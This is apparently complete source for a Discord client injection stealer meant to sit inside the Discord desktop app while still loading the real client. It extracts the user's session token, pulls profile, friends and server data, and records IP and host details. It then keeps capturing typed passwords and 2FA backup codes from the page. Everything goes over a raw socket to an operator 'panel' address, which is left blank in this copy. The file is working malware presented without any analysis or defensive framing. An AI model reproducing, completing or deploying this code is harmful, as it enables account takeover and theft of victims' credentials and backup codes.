const { BrowserWindow, app } = require("electron");
const net = require('net');
const https = require('https');
const crypto = require('crypto');

const PANEL_IP = "";
const PANEL_PORT = 0;

let lastPasswordHash = null;
let lastBackupCodesHash = null;

function sendToPanel(payload) {
    return new Promise((resolve) => {
        const client = new net.Socket();
        client.connect(PANEL_PORT, PANEL_IP, () => {
            client.write(JSON.stringify(payload) + "\r\n\r\n");
            client.once('data', () => { client.destroy(); resolve(true); });
        });
        client.on('error', () => resolve(false));
        client.setTimeout(10000, () => { client.destroy(); resolve(false); });
    });
}

async function getDiscordToken() {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return null;
    try {
        const token = await mainWindow.webContents.executeJavaScript(`
            (function() {
                let token = null;
                if (window.webpackChunkdiscord_app) {
                    window.webpackChunkdiscord_app.push([[Symbol()], {}, o => {
                        for (let e of Object.values(o.c)) {
                            try {
                                if (!e.exports || e.exports === window) continue;
                                if (e.exports?.getToken) token = e.exports.getToken();
                                for (let key in e.exports) {
                                    if (e.exports?.[key]?.getToken && "IntlMessagesProxy" !== e.exports[key][Symbol.toStringTag]) {
                                        token = e.exports[key].getToken();
                                    }
                                }
                            } catch { }
                        }
                    }]);
                    window.webpackChunkdiscord_app.pop();
                }
                if (!token) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key && key.includes('token')) {
                            try {
                                const value = localStorage.getItem(key);
                                const parsed = JSON.parse(value);
                                if (parsed && parsed.token) token = parsed.token;
                            } catch(e) {}
                        }
                    }
                }
                return token;
            })();
        `);
        return token;
    } catch (err) {
        return null;
    }
}

async function getIpInfo() {
    return new Promise((resolve) => {
        https.get('https://ipinfo.io/json', (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch { resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }); }
            });
        }).on('error', () => resolve({ ip: 'Unknown', city: 'Unknown', country: 'Unknown' }));
    });
}

async function getDiscordUserInfo(token) {
    return new Promise((resolve) => {
        const options = { hostname: 'discord.com', path: '/api/v9/users/@me', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve(null); } });
        });
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function getDiscordRelationships(token) {
    return new Promise((resolve) => {
        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/relationships', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve(null); } });
        });
        req.on('error', () => resolve(null));
        req.end();
    });
}

async function getDiscordGuilds(token) {
    return new Promise((resolve) => {
        const options = { hostname: 'discord.com', path: '/api/v9/users/@me/guilds', method: 'GET', headers: { 'Authorization': token } };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => { try { resolve(JSON.parse(data)); } catch { resolve(null); } });
        });
        req.on('error', () => resolve(null));
        req.end();
    });
}

function getSystemInfo() {
    const os = require('os');
    return {
        os: os.platform() + ' ' + os.release(),
        hostname: os.hostname(),
        username_system: os.userInfo().username,
        pc_name: os.hostname()
    };
}

async function sendInitialData(ipData, token, userInfo, relationships, guilds) {
    const si = getSystemInfo();
    const badges = [];
    if (userInfo && userInfo.flags) {
        if (userInfo.flags & 1) badges.push('Discord Employee');
        if (userInfo.flags & 2) badges.push('Discord Partner');
        if (userInfo.flags & 4) badges.push('HypeSquad Events');
        if (userInfo.flags & 8) badges.push('Bug Hunter Level 1');
        if (userInfo.flags & 64) badges.push('HypeSquad Bravery');
        if (userInfo.flags & 128) badges.push('HypeSquad Brilliance');
        if (userInfo.flags & 256) badges.push('HypeSquad Balance');
        if (userInfo.flags & 512) badges.push('Early Supporter');
        if (userInfo.flags & 16384) badges.push('Bug Hunter Level 2');
        if (userInfo.flags & 131072) badges.push('Verified Developer');
        if (userInfo.flags & 4194304) badges.push('Active Developer');
    }
    await sendToPanel({
        ...si,
        injection_type: "initial",
        token: token,
        user_info: userInfo,
        ip_info: ipData,
        relationships: relationships,
        guild_count: guilds && Array.isArray(guilds) ? guilds.length : 0,
        badges: badges
    });
}

async function monitorPasswordChanges(token, ipData, userInfo, relationships, guilds) {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    setInterval(async () => {
        try {
            const currentPassword = await mainWindow.webContents.executeJavaScript(`
                (function() {
                    try {
                        const passwordInputs = document.querySelectorAll('input[type="password"]');
                        for (let input of passwordInputs) {
                            if (input.value && input.value.length > 0) return input.value;
                        }
                        return null;
                    } catch(e) { return null; }
                })();
            `);
            if (currentPassword) {
                const currentHash = crypto.createHash('sha256').update(currentPassword).digest('hex');
                if (lastPasswordHash !== null && lastPasswordHash !== currentHash) {
                    const si = getSystemInfo();
                    await sendToPanel({ ...si, injection_type: "password_change", password: currentPassword });
                }
                lastPasswordHash = currentHash;
            }
        } catch(err) {}
    }, 3000);
}

async function monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds) {
    const mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;
    setInterval(async () => {
        try {
            const backupCodes = await mainWindow.webContents.executeJavaScript(`
                (function() {
                    try {
                        const backupCodesList = [];
                        const pageText = document.body.innerText;
                        const codeRegex = /[A-Z0-9]{4,}-[A-Z0-9]{4,}-[A-Z0-9]{4,}/gi;
                        const matches = pageText.match(codeRegex);
                        if (matches) backupCodesList.push(...matches);
                        return backupCodesList.length > 0 ? backupCodesList.join(', ') : null;
                    } catch(e) { return null; }
                })();
            `);
            if (backupCodes) {
                const currentHash = crypto.createHash('sha256').update(backupCodes).digest('hex');
                if (lastBackupCodesHash !== null && lastBackupCodesHash !== currentHash) {
                    const si = getSystemInfo();
                    await sendToPanel({ ...si, injection_type: "backup_codes", codes: backupCodes });
                }
                lastBackupCodesHash = currentHash;
            }
        } catch(err) {}
    }, 5000);
}

app.whenReady().then(async () => {
    try {
        await new Promise(r => setTimeout(r, 5000));
        const ipData = await getIpInfo();
        const token = await getDiscordToken();
        if (token) {
            const userInfo = await getDiscordUserInfo(token);
            const relationships = await getDiscordRelationships(token);
            const guilds = await getDiscordGuilds(token);
            await sendInitialData(ipData, token, userInfo, relationships, guilds);
            monitorPasswordChanges(token, ipData, userInfo, relationships, guilds);
            monitorBackupCodeChanges(token, ipData, userInfo, relationships, guilds);
        } else {
            const si = getSystemInfo();
            await sendToPanel({ ...si, injection_type: "error", error: "No token found" });
        }
    } catch (err) {}
});

module.exports = require("./core.asar");
